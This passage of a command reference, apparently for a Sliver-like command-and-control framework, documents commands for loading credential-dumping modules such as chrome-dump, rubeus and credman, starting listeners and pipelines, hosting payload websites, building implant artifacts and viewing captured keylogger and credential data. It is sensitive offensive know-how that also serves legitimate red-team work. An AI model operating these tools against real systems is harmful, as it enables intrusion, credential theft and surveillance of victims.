\"x64\":\"chrome-dump.so\" \n                    } \n                }, \n                {\n                    \"os\":\"darwin\", \n                    \"files\":{ \n                        \"x64\":\"chrome-dump.dylib\"\n                        } \n                    } \n                ], \n            \"isReflective\":false // only set to true when using a reflective DLL\n        } \n    ] \n} \n</code></pre> <p>Each command will have the --process flag defined, which allows you to specify the process to inject into. The following default values are set:</p> <pre><code>- Windows: c:\\windows\\system32\\notepad.exe \n- Linux: /bin/bash \n- Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment\n</code></pre> <pre><code>alias\n</code></pre> <p>SEE ALSO</p> <ul> <li>alias install    - Install a command alias</li> <li>alias list  - List all aliases</li> <li>alias load  - Load a command alias</li> <li>alias remove  - Remove an alias</li> </ul>"},{"location":"IoM/manual/manual/client/#alias-install","title":"alias install","text":"<p>Install a command alias</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>alias install [alias_file]\n</code></pre> <p>Examples</p> <pre><code>// Install a command alias\nalias install ./rubeus.exe\n</code></pre> <p>SEE ALSO</p> <ul> <li>alias    - manage aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#alias-list","title":"alias list","text":"<p>List all aliases</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>alias list [flags]\n</code></pre> <p>Options</p> <pre><code>      --static   show all alias in static table\n</code></pre> <p>SEE ALSO</p> <ul> <li>alias    - manage aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#alias-load","title":"alias load","text":"<p>Load a command alias</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>alias load [alias]\n</code></pre> <p>Examples</p> <pre><code>// Load a command alias\nalias load /tmp/chrome-dump\n</code></pre> <p>SEE ALSO</p> <ul> <li>alias    - manage aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#alias-remove","title":"alias remove","text":"<p>Remove an alias</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>alias remove [alias]\n</code></pre> <p>Examples</p> <pre><code>// Remove an alias\nalias remove rubeus\n</code></pre> <p>SEE ALSO</p> <ul> <li>alias    - manage aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#extension","title":"extension","text":"<p>Extension commands</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>extension\n</code></pre> <p>SEE ALSO</p> <ul> <li>extension install    - Install an extension</li> <li>extension list  - List all extensions</li> <li>extension load  - Load an extension</li> <li>extension remove  - Remove an extension</li> </ul>"},{"location":"IoM/manual/manual/client/#extension-install","title":"extension install","text":"<p>Install an extension</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>extension install [extension_file]\n</code></pre> <p>Examples</p> <pre><code>// Install an extension\nextension install ./credman.tar.gz\n</code></pre> <p>SEE ALSO</p> <ul> <li>extension    - Extension commands</li> </ul>"},{"location":"IoM/manual/manual/client/#extension-list","title":"extension list","text":"<p>List all extensions</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>extension list\n</code></pre> <p>SEE ALSO</p> <ul> <li>extension    - Extension commands</li> </ul>"},{"location":"IoM/manual/manual/client/#extension-load","title":"extension load","text":"<p>Load an extension</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>extension load [extension]\n</code></pre> <p>Examples</p> <pre><code>// Load an extension\nextension load ./credman/\n</code></pre> <p>SEE ALSO</p> <ul> <li>extension    - Extension commands</li> </ul>"},{"location":"IoM/manual/manual/client/#extension-remove","title":"extension remove","text":"<p>Remove an extension</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Aliases%20and%20Extensions</p> <pre><code>extension remove [extension]\n</code></pre> <p>Examples</p> <pre><code>// Remove an extension\nextension remove credman\n</code></pre> <p>SEE ALSO</p> <ul> <li>extension    - Extension commands</li> </ul>"},{"location":"IoM/manual/manual/client/#armory","title":"armory","text":"<p>Automatically download and install extensions/aliases</p> <p></p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Armory</p> <pre><code>armory [flags]\n</code></pre> <p>Options</p> <pre><code>      --bundle           install bundle\n  -c, --ignore-cache     ignore metadata cache, force refresh\n  -I, --insecure         skip tls certificate validation\n  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)\n      --static           show all armory in static table\n  -t, --timeout string   download timeout\n</code></pre> <p>SEE ALSO</p> <ul> <li>armory install  - Install a command armory</li> <li>armory search    - Search for armory packages</li> <li>armory update    - Update installed armory packages</li> </ul>"},{"location":"IoM/manual/manual/client/#armory-install","title":"armory install","text":"<p>Install a command armory</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Armory</p> <pre><code>armory install [armory] [flags]\n</code></pre> <p>Examples</p> <pre><code>// Install a command armory\narmory install rubeus \n</code></pre> <p>Options</p> <pre><code>  -a, --armory string   name of the armory to install from (default \"Default\")\n  -f, --force           force installation of package, overwriting the package if it exists\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>  -c, --ignore-cache     ignore metadata cache, force refresh\n  -I, --insecure         skip tls certificate validation\n  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)\n  -t, --timeout string   download timeout\n</code></pre> <p>SEE ALSO</p> <ul> <li>armory  - Automatically download and install extensions/aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#armory-search","title":"armory search","text":"<p>Search for armory packages</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Armory</p> <pre><code>armory search [armory] [flags]\n</code></pre> <p>Options</p> <pre><code>      --static   show searched armory in static table\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>  -c, --ignore-cache     ignore metadata cache, force refresh\n  -I, --insecure         skip tls certificate validation\n  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)\n  -t, --timeout string   download timeout\n</code></pre> <p>SEE ALSO</p> <ul> <li>armory  - Automatically download and install extensions/aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#armory-update","title":"armory update","text":"<p>Update installed armory packages</p> <p>Description</p> <p>See Docs at https://sliver.sh/docs?name=Armory</p> <pre><code>armory update [flags]\n</code></pre> <p>Options</p> <pre><code>  -a, --armory string   name of armory to install package from (default \"Default\")\n</code></pre> <p>Options inherited from parent commands</p> <pre><code>  -c, --ignore-cache     ignore metadata cache, force refresh\n  -I, --insecure         skip tls certificate validation\n  -p, --proxy string     specify a proxy url (e.g. http://localhost:8080)\n  -t, --timeout string   download timeout\n</code></pre> <p>SEE ALSO</p> <ul> <li>armory  - Automatically download and install extensions/aliases</li> </ul>"},{"location":"IoM/manual/manual/client/#mal","title":"mal","text":"<p>mal commands</p> <pre><code>mal [flags]\n</code></pre> <p>Options</p> <pre><code>      --ignore-cache     ignore cache\n      --insecure         insecure\n      --proxy string     proxy\n      --static           show all mal in static table\n      --timeout string   timeout\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal install    - Install a mal manifest</li> <li>mal list  - List mal manifests</li> <li>mal load  - Load a mal manifest</li> <li>mal refresh    - Refresh mal manifests</li> <li>mal remove  - Remove a mal manifest</li> <li>mal update  - Update a mal or all mals</li> </ul>"},{"location":"IoM/manual/manual/client/#mal-install","title":"mal install","text":"<p>Install a mal manifest</p> <pre><code>mal install [mal_file] [flags]\n</code></pre> <p>Options</p> <pre><code>      --ignore-cache     ignore cache\n      --insecure         insecure\n      --proxy string     proxy\n      --timeout string   timeout\n      --version string   mal version to install (default \"latest\")\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal    - mal commands</li> </ul>"},{"location":"IoM/manual/manual/client/#mal-list","title":"mal list","text":"<p>List mal manifests</p> <pre><code>mal list\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal    - mal commands</li> </ul>"},{"location":"IoM/manual/manual/client/#mal-load","title":"mal load","text":"<p>Load a mal manifest</p> <pre><code>mal load [mal]\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal    - mal commands</li> </ul>"},{"location":"IoM/manual/manual/client/#mal-refresh","title":"mal refresh","text":"<p>Refresh mal manifests</p> <pre><code>mal refresh\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal    - mal commands</li> </ul>"},{"location":"IoM/manual/manual/client/#mal-remove","title":"mal remove","text":"<p>Remove a mal manifest</p> <pre><code>mal remove [mal]\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal    - mal commands</li> </ul>"},{"location":"IoM/manual/manual/client/#mal-update","title":"mal update","text":"<p>Update a mal or all mals</p> <pre><code>mal update [flags]\n</code></pre> <p>Options</p> <pre><code>  -a, --all              update all mal\n      --ignore-cache     ignore cache\n      --insecure         insecure\n      --proxy string     proxy\n      --timeout string   timeout\n</code></pre> <p>SEE ALSO</p> <ul> <li>mal    - mal commands</li> </ul>"},{"location":"IoM/manual/manual/client/#config","title":"config","text":"<p>Config operations</p> <pre><code>config\n</code></pre> <p>SEE ALSO</p> <ul> <li>config github    - Show Github config and more operations</li> <li>config notify    - Show Notify config and more operations</li> <li>config refresh  - Refresh config</li> </ul>"},{"location":"IoM/manual/manual/client/#config-github","title":"config github","text":"<p>Show Github config and more operations</p> <pre><code>config github\n</code></pre> <p>SEE ALSO</p> <ul> <li>config  - Config operations</li> <li>config github update  - Update Github config</li> </ul>"},{"location":"IoM/manual/manual/client/#config-github-update","title":"config github update","text":"<p>Update Github config</p> <pre><code>config github update [flags]\n</code></pre> <p>Options</p> <pre><code>      --owner string          github owner\n      --repo string           github repo\n      --token string          github token\n      --workflowFile string   github workflow file\n</code></pre> <p>SEE ALSO</p> <ul> <li>config github    - Show Github config and more operations</li> </ul>"},{"location":"IoM/manual/manual/client/#config-notify","title":"config notify","text":"<p>Show Notify config and more operations</p> <pre><code>config notify\n</code></pre> <p>SEE ALSO</p> <ul> <li>config  - Config operations</li> <li>config notify update  - Update Notify config</li> </ul>"},{"location":"IoM/manual/manual/client/#config-notify-update","title":"config notify update","text":"<p>Update Notify config</p> <pre><code>config notify update [flags]\n</code></pre> <p>Options</p> <pre><code>      --dingtalk-enable           enable dingtalk\n      --dingtalk-secret string    dingtalk secret\n      --dingtalk-token string     dingtalk token\n      --lark-enable               enable lark\n      --lark-webhook-url string   lark webhook url\n      --pushplus-channel string   pushplus channel (default \"wechat\")\n      --pushplus-enable           enable pushplus\n      --pushplus-token string     pushplus token\n      --pushplus-topic string     pushplus topic\n      --serverchan-enable         enable serverchan\n      --serverchan-url string     serverchan url\n      --telegram-chat-id int      telegram chat id\n      --telegram-enable           enable telegram\n      --telegram-token string     telegram token\n</code></pre> <p>SEE ALSO</p> <ul> <li>config notify    - Show Notify config and more operations</li> </ul>"},{"location":"IoM/manual/manual/client/#config-refresh","title":"config refresh","text":"<p>Refresh config</p> <pre><code>config refresh [flags]\n</code></pre> <p>Options</p> <pre><code>      --client   Refresh client config\n</code></pre> <p>SEE ALSO</p> <ul> <li>config  - Config operations</li> </ul>"},{"location":"IoM/manual/manual/client/#context","title":"context","text":"<p>Context management</p> <p>Description</p> <p>Manage different types of contexts (download, upload, credential, etc)</p> <pre><code>context\n</code></pre> <p>SEE ALSO</p> <ul> <li>context credential  - List credential contexts</li> <li>context download  - List download contexts</li> <li>context keylogger    - List keylogger contexts</li> <li>context port  - List port scan contexts</li> <li>context screenshot  - List screenshot contexts</li> <li>context upload  - List upload contexts</li> </ul>"},{"location":"IoM/manual/manual/client/#context-credential","title":"context credential","text":"<p>List credential contexts</p> <pre><code>context credential\n</code></pre> <p>SEE ALSO</p> <ul> <li>context    - Context management</li> </ul>"},{"location":"IoM/manual/manual/client/#context-download","title":"context download","text":"<p>List download contexts</p> <pre><code>context download\n</code></pre> <p>SEE ALSO</p> <ul> <li>context    - Context management</li> </ul>"},{"location":"IoM/manual/manual/client/#context-keylogger","title":"context keylogger","text":"<p>List keylogger contexts</p> <pre><code>context keylogger\n</code></pre> <p>SEE ALSO</p> <ul> <li>context    - Context management</li> </ul>"},{"location":"IoM/manual/manual/client/#context-port","title":"context port","text":"<p>List port scan contexts</p> <pre><code>context port\n</code></pre> <p>SEE ALSO</p> <ul> <li>context    - Context management</li> </ul>"},{"location":"IoM/manual/manual/client/#context-screenshot","title":"context screenshot","text":"<p>List screenshot contexts</p> <pre><code>context screenshot\n</code></pre> <p>SEE ALSO</p> <ul> <li>context    - Context management</li> </ul>"},{"location":"IoM/manual/manual/client/#context-upload","title":"context upload","text":"<p>List upload contexts</p> <pre><code>context upload\n</code></pre> <p>SEE ALSO</p> <ul> <li>context    - Context management</li> </ul>"},{"location":"IoM/manual/manual/client/#sync","title":"sync","text":"<p>Sync context</p> <p>Description</p> <p>sync context from server</p> <pre><code>sync [context_id]\n</code></pre> <p>Examples</p> <pre><code>sync [context_id]\n</code></pre>"},{"location":"IoM/manual/manual/client/#cert","title":"cert","text":"<p>Cert list</p> <pre><code>cert\n</code></pre> <p>Examples</p> <pre><code>cert\n</code></pre> <p>SEE ALSO</p> <ul> <li>cert delete    - </li> <li>cert download    - download a cert</li> <li>cert import    - import a new cert</li> <li>cert self_signed  - generate a self-signed cert</li> <li>cert update    - update a cert</li> </ul>"},{"location":"IoM/manual/manual/client/#cert-delete","title":"cert delete","text":"<pre><code>cert delete\n</code></pre> <p>Examples</p> <pre><code>// delete a cert\ncert delete cert-name\n</code></pre> <p>SEE ALSO</p> <ul> <li>cert  - Cert list</li> </ul>"},{"location":"IoM/manual/manual/client/#cert-download","title":"cert download","text":"<p>download a cert</p> <pre><code>cert download [flags]\n</code></pre> <p>Examples</p> <pre><code>// download a cert\ncert download cert-name -o cert_path \n</code></pre> <p>Options</p> <pre><code>  -o, --output string   cert save path\n</code></pre> <p>SEE ALSO</p> <ul> <li>cert  - Cert list</li> </ul>"},{"location":"IoM/manual/manual/client/#cert-import","title":"cert import","text":"<p>import a new cert</p> <pre><code>cert import [flags]\n</code></pre> <p>Examples</p> <pre><code>// generate a imported cert to server\ncert import --cert cert_file_path --key key_file_path --ca-cert ca_cert_path\n</code></pre> <p>Options</p> <pre><code>      --ca-cert string   tls ca cert path\n      --cert string      tls cert path\n      --key string       tls key path\n</code></pre> <p>SEE ALSO</p> <ul> <li>cert  - Cert list</li> </ul>"},{"location":"IoM/manual/manual/client/#cert-self_signed","title":"cert self_signed","text":"<p>generate a self-signed cert</p> <pre><code>cert self_signed [flags]\n</code></pre> <p>Examples</p> <pre><code>// generate a self-signed cert without using certificate information\ncert selfSign\n\n// generate a self-signed cert using certificate information\ncert selfSign --CN commonName --O \"Example Organization\" --C US --L \"San Francisco\" --OU \"IT Department\" --ST California --validity 365\n</code></pre> <p>Options</p> <pre><code>      --C string          Certificate Country (C)\n      --CN string         Certificate Common Name (CN)\n      --L string          Certificate Locality/City (L)\n      --O string          Certificate Organization (O)\n      --OU string         Certificate Organizational Unit (OU)\n      --ST string         Certificate State/Province (ST)\n      --validity string   Certificate validity period in days (default \"365\")\n</code></pre> <p>SEE ALSO</p> <ul> <li>cert  - Cert list</li> </ul>"},{"location":"IoM/manual/manual/client/#cert-update","title":"cert update","text":"<p>update a cert</p> <pre><code>cert update [flags]\n</code></pre> <p>Examples</p> <pre><code>// update a cert\ncert update cert-name --cert cert_path --key key_path --type imported\n</code></pre> <p>Options</p> <pre><code>      --ca-cert string   tls ca cert path\n      --cert string      tls cert path\n      --key string       tls key path\n      --type string      cert type\n</code></pre> <p>SEE ALSO</p> <ul> <li>cert  - Cert list</li> </ul>"},{"location":"IoM/manual/manual/client/#listener","title":"listener","text":""},{"location":"IoM/manual/manual/client/#job","title":"job","text":"<p>List jobs in server</p> <p>Description</p> <p>Use a table to list jobs on the server</p> <pre><code>job\n</code></pre> <p>Examples</p> <pre><code>job\n</code></pre>"},{"location":"IoM/manual/manual/client/#listener_1","title":"listener","text":"<p>List listeners in server</p> <p>Description</p> <p>Use a table to list listeners on the server</p> <pre><code>listener\n</code></pre> <p>Examples</p> <pre><code>listener\n</code></pre>"},{"location":"IoM/manual/manual/client/#pipeline","title":"pipeline","text":"<p>manage pipeline</p> <pre><code>pipeline\n</code></pre> <p>SEE ALSO</p> <ul> <li>pipeline delete    - Delete a pipeline</li> <li>pipeline list    - List pipelines in listener</li> <li>pipeline start  - Start a TCP pipeline</li> <li>pipeline stop    - Stop pipeline</li> </ul>"},{"location":"IoM/manual/manual/client/#pipeline-delete","title":"pipeline delete","text":"<p>Delete a pipeline</p> <pre><code>pipeline delete\n</code></pre> <p>SEE ALSO</p> <ul> <li>pipeline  - manage pipeline</li> </ul>"},{"location":"IoM/manual/manual/client/#pipeline-list","title":"pipeline list","text":"<p>List pipelines in listener</p> <pre><code>pipeline list\n</code></pre> <p>Examples</p> <p>list all pipelines <pre><code>pipeline list\n</code></pre></p> <p>list pipelines in listener <pre><code>pipeline list listener_id\n</code></pre></p> <p>SEE ALSO</p> <ul> <li>pipeline  - manage pipeline</li> </ul>"},{"location":"IoM/manual/manual/client/#pipeline-start","title":"pipeline start","text":"<p>Start a TCP pipeline</p> <p>Description</p> <p>Start a TCP pipeline with the specified name and listener ID</p> <pre><code>pipeline start [flags]\n</code></pre> <p>Examples</p> <pre><code>tcp start tcp_test\n</code></pre> <p>Options</p> <pre><code>      --cert-name string   certificate name\n</code></pre> <p>SEE ALSO</p> <ul> <li>pipeline  - manage pipeline</li> </ul>"},{"location":"IoM/manual/manual/client/#pipeline-stop","title":"pipeline stop","text":"<p>Stop pipeline</p> <p>Description</p> <p>Stop pipeline with the specified name and listener ID</p> <pre><code>pipeline stop\n</code></pre> <p>Examples</p> <pre><code>pipeline stop tcp_test\n</code></pre> <p>SEE ALSO</p> <ul> <li>pipeline  - manage pipeline</li> </ul>"},{"location":"IoM/manual/manual/client/#website","title":"website","text":"<p>Register a new website</p> <p></p> <p>Description</p> <p>Register a new website with the specified listener. If name is not provided, it will be generated in the format listenerID_web_port.</p> <pre><code>website [flags]\n</code></pre> <p>Examples</p> <pre><code>// Register a website with the default settings\nwebsite web_test --listener tcp_default --root /webtest\n\n// Register a website with a custom name and port\nwebsite web_test --listener tcp_default --port 5003 --root /webtest\n\n// Register a website with TLS enabled\nwebsite web_test --listener tcp_default --root /webtest --tls --cert /path/to/cert --key /path/to/key\n</code></pre> <p>Options</p> <pre><code>      --cert string        tls cert path\n      --cert-name string   certificate name\n      --host string        pipeline host, the default value is **0.0.0.0** (default \"0.0.0.0\")\n      --ip string          external ip (default \"ip\")\n      --key string         tls key path\n  -l, --listener string    listener id\n  -p, --port uint32        pipeline port, random port is selected from the range **10000-15000** \n      --root string        website root path (default \"/\")\n  -t, --tls                enable tls\n</code></pre> <p>SEE ALSO</p> <ul> <li>website add    - Add content to a website</li> <li>website list  - List website in listener</li> <li>website list-content  - List content in a website</li> <li>website remove  - Remove content from a website</li> <li>website start    - Start a website</li> <li>website stop  - Stop a website</li> <li>website update  - Update content in a website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-add","title":"website add","text":"<p>Add content to a website</p> <p>Description</p> <p>Add new content to an existing website</p> <pre><code>website add [file_path] [flags]\n</code></pre> <p>Examples</p> <pre><code>// Add content to a website with default web path (using filename)\nwebsite add /path/to/content.html --website web_test\n\n// Add content to a website with custom web path and type\nwebsite add /path/to/content.html --website web_test --path /custom/path --type text/html\n</code></pre> <p>Options</p> <pre><code>      --path string      web path for the content (defaults to filename)\n      --type string      content type of the file (default \"raw\")\n      --website string   website name (required)\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-list","title":"website list","text":"<p>List website in listener</p> <p>Description</p> <p>Use a table to list websites along with their corresponding listeners</p> <pre><code>website list\n</code></pre> <p>Examples</p> <pre><code>website [listener]\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-list-content","title":"website list-content","text":"<p>List content in a website</p> <p>Description</p> <p>List all content in a website with detailed information</p> <pre><code>website list-content [website_name]\n</code></pre> <p>Examples</p> <pre><code>// List all content in a website with detailed information\nwebsite list-content web_test\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-remove","title":"website remove","text":"<p>Remove content from a website</p> <p>Description</p> <p>Remove content from an existing website using content ID</p> <pre><code>website remove [content_id]\n</code></pre> <p>Examples</p> <pre><code>// Remove content from a website using content ID\nwebsite remove 123e4567-e89b-12d3-a456-426614174000\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-start","title":"website start","text":"<p>Start a website</p> <p>Description</p> <p>Start a website with the specified name</p> <pre><code>website start [name] [flags]\n</code></pre> <p>Examples</p> <pre><code>// Start a website\nwebsite start web_test \n</code></pre> <p>Options</p> <pre><code>      --cert-name string   certificate name\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-stop","title":"website stop","text":"<p>Stop a website</p> <p></p> <p>Description</p> <p>Stop a website with the specified name</p> <pre><code>website stop [name] [flags]\n</code></pre> <p>Examples</p> <pre><code>// Stop a website\nwebsite stop web_test --listener tcp_default\n</code></pre> <p>Options</p> <pre><code>      --listener string   listener ID\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#website-update","title":"website update","text":"<p>Update content in a website</p> <p>Description</p> <p>Update existing content in a website using content ID</p> <pre><code>website update [content_id] [file_path] [flags]\n</code></pre> <p>Examples</p> <pre><code>// Update content in a website with content ID\nwebsite update 123e4567-e89b-12d3-a456-426614174000 /path/to/new_content.html --website web_test\n</code></pre> <p>Options</p> <pre><code>      --type string      content type of the file (default \"raw\")\n      --website string   website name (required)\n</code></pre> <p>SEE ALSO</p> <ul> <li>website    - Register a new website</li> </ul>"},{"location":"IoM/manual/manual/client/#bind","title":"bind","text":"<p>Register a new bind pipeline and start it</p> <pre><code>bind [flags]\n</code></pre> <p>Examples</p> <p>new bind pipeline <pre><code>bind listener\n</code></pre></p> <p>Options</p> <pre><code>      --listener string   listener id\n</code></pre>"},{"location":"IoM/manual/manual/client/#http","title":"http","text":"<p>Register a new HTTP pipeline and start it</p> <p>Description</p> <p>Register a new HTTP pipeline with the specified listener.</p> <pre><code>http [flags]\n</code></pre> <p>Examples</p> <pre><code>// Register an HTTP pipeline with the default settings\nhttp --listener http_default\n\n// Register an HTTP pipeline with custom headers and error page\nhttp --name http_test --listener http_default --host 192.168.0.43 --port 8080 --headers \"Content-Type=text/html\" --error-page /path/to/error.html\n\n// Register an HTTP pipeline with TLS enabled\nhttp --listener http_default --tls --cert_path /path/to/cert --key_path /path/to/key\n</code></pre> <p>Options</p> <pre><code>      --cert string              tls cert path\n      --cert-name string         certificate name\n      --encryption-key string    encryption key\n      --encryption-type string   encryption type\n      --error-page string        Path to custom error page file\n      --headers stringToString   HTTP response headers (key=value) (default [])\n      --host string              pipeline host, the default value is **0.0.0.0** (default \"0.0.0.0\")\n      --ip string                external ip (default \"ip\")\n      --key string               tls key path\n  -l, --listener string          listener id\n      --parser string            pipeline parser (default \"default\")\n  -p, --port uint32              pipeline port, random port is selected from the range **10000-15000** \n      --secure                   enable secure mode\n  -t, --tls                      enable tls\n</code></pre>"},{"location":"IoM/manual/manual/client/#rem","title":"rem","text":"<pre><code>rem\n</code></pre> <p>Examples</p> <pre><code>rem\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem delete  - Delete a REM</li> <li>rem list  - List REMs in listener</li> <li>rem new    - Register a new REM and start it</li> <li>rem start    - Start a REM</li> <li>rem stop  - Stop a REM</li> </ul>"},{"location":"IoM/manual/manual/client/#rem-delete","title":"rem delete","text":"<p>Delete a REM</p> <pre><code>rem delete\n</code></pre> <p>Examples</p> <pre><code>rem delete rem_test\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem    - </li> </ul>"},{"location":"IoM/manual/manual/client/#rem-list","title":"rem list","text":"<p>List REMs in listener</p> <p>Description</p> <p>Use a table to list REMs along with their corresponding listeners</p> <pre><code>rem list [listener]\n</code></pre> <p>Examples</p> <pre><code>rem\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem    - </li> </ul>"},{"location":"IoM/manual/manual/client/#rem-new","title":"rem new","text":"<p>Register a new REM and start it</p> <p></p> <p>Description</p> <p>Register a new REM with the specified listener.</p> <pre><code>rem new [name] [flags]\n</code></pre> <p>Examples</p> <pre><code>// Register a REM with the default settings\nrem new --listener listener_id\n\n// Register a REM with a custom name and console URL\nrem new rem_test --listener listener_id -c tcp://127.0.0.1:19966\n</code></pre> <p>Options</p> <pre><code>  -c, --console string    REM console URL (default \"tcp://0.0.0.0\")\n  -l, --listener string   listener id\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem    - </li> </ul>"},{"location":"IoM/manual/manual/client/#rem-start","title":"rem start","text":"<p>Start a REM</p> <p>Description</p> <p>Start a REM with the specified name</p> <pre><code>rem start\n</code></pre> <p>Examples</p> <pre><code>rem start rem_test\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem    - </li> </ul>"},{"location":"IoM/manual/manual/client/#rem-stop","title":"rem stop","text":"<p>Stop a REM</p> <p></p> <p>Description</p> <p>Stop a REM with the specified name</p> <pre><code>rem stop\n</code></pre> <p>Examples</p> <pre><code>rem stop rem_test\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem    - </li> </ul>"},{"location":"IoM/manual/manual/client/#tcp","title":"tcp","text":"<p>Register a new TCP pipeline and start it</p> <p></p> <p>Description</p> <p>Register a new TCP pipeline with the specified listener.</p> <pre><code>tcp [flags]\n</code></pre> <p>Examples</p> <pre><code>// Register a TCP pipeline with the default settings\ntcp --listener tcp_default\n\n// Register a TCP pipeline with a custom name, host, and port\ntcp --name tcp_test --listener tcp_default --host 192.168.0.43 --port 5003\n\n// Register a TCP pipeline with TLS enabled and specify certificate and key paths\ntcp --listener tcp_default --tls --cert_path /path/to/cert --key_path /path/to/key\n</code></pre> <p>Options</p> <pre><code>      --cert string              tls cert path\n      --cert-name string         certificate name\n      --encryption-key string    encryption key\n      --encryption-type string   encryption type\n      --host string              pipeline host, the default value is **0.0.0.0** (default \"0.0.0.0\")\n      --ip string                external ip (default \"ip\")\n      --key string               tls key path\n  -l, --listener string          listener id\n      --parser string            pipeline parser (default \"default\")\n  -p, --port uint32              pipeline port, random port is selected from the range **10000-15000** \n      --secure                   enable secure mode\n  -t, --tls                      enable tls\n</code></pre>"},{"location":"IoM/manual/manual/client/#generator","title":"generator","text":""},{"location":"IoM/manual/manual/client/#artifact","title":"artifact","text":"<p>artifact manage</p> <p>Description</p> <p>Manage build output files on the server. Use the list command to view all available artifacts, download to retrieve a specific artifact, and upload to add a new artifact to the server.</p> <p>SEE ALSO</p> <ul> <li>artifact delete    - Delete a artifact file in the server</li> <li>artifact download    - Download a build output file from the server</li> <li>artifact list    - list build output file in server</li> <li>artifact show    - show artifact info and profile</li> <li>artifact upload    - Upload a build output file to the server</li> </ul>"},{"location":"IoM/manual/manual/client/#artifact-delete","title":"artifact delete","text":"<p>Delete a artifact file in the server</p> <p>Description</p> <p>Delete a specify artifact in the server.</p> <pre><code>artifact delete  \n</code></pre> <p>Examples</p> <pre><code>artifact delete --name artifact_name\n</code></pre> <p>SEE ALSO</p> <ul> <li>artifact  - artifact manage</li> </ul>"},{"location":"IoM/manual/manual/client/#artifact-download","title":"artifact download","text":"<p>Download a build output file from the server</p> <p>Description</p> <p>Download a specific build output file from the server by specifying its unique artifact name.</p> <pre><code>artifact download [flags]\n</code></pre> <p>Examples</p> <p>// Download a artifact     artifact download artifact_name</p> <p>// Download a artifact to specific path     artifact download artifact_name -o /path/to/output</p> <p>// Download an artifact in a specific format (e.g.raw, bin, golang source, C source, etc.)     artifact download artifact_name --format raw</p> <p>Options</p> <pre><code>      --RDI string      RDI type\n  -f, --format string   the format of the artifact (default \"executable\")\n  -o, --output string   output path\n</code></pre> <p>SEE ALSO</p> <ul> <li>artifact  - artifact manage</li> </ul>"},{"location":"IoM/manual/manual/client/#artifact-list","title":"artifact list","text":"<p>list build output file in server</p> <p></p> <p>Description</p> <p>Retrieve a list of all build output files currently stored on the server.</p> <p>This command fetches metadata about artifacts, such as their names, IDs, and associated build configurations. The artifacts are displayed in a table format for easy navigation.</p> <pre><code>artifact list [flags]\n</code></pre> <p>Examples</p> <pre><code>// List all available build artifacts on the server\nartifact list\n\n// Navigate the artifact table and press enter to download a specific artifact\n</code></pre> <p>Options</p> <pre><code>      --static   show all artifact in static table\n</code></pre> <p>SEE ALSO</p> <ul> <li>artifact  - artifact manage</li> </ul>"},{"location":"IoM/manual/manual/client/#artifact-show","title":"artifact show","text":"<p>show artifact info and profile</p> <pre><code>artifact show [flags]\n</code></pre> <p>Examples</p> <pre><code>artifact show artifact_name\n\nartifact show artifact_name --profile\n</code></pre> <p>Options</p> <pre><code>      --profile   show profile\n</code></pre> <p>SEE ALSO</p> <ul> <li>artifact  - artifact manage</li> </ul>"},{"location":"IoM/manual/manual/client/#artifact-upload","title":"artifact upload","text":"<p>Upload a build output file to the server</p> <p>Description</p> <p>Upload a custom artifact to the server for storage or further use.</p> <pre><code>artifact upload [flags]\n</code></pre> <p>Examples</p> <pre><code>// Upload an artifact with default settings\nartifact upload /path/to/artifact\n\n// Upload an artifact with a specific stage and alias name\nartifact upload /path/to/artifact --stage production --name my_artifact\n\n// Upload an artifact and specify its type\nartifact upload /path/to/artifact --type DLL\n</code></pre> <p>Options</p> <pre><code>  -n, --name string     alias name\n      --target string   rust target\n  -t, --type string     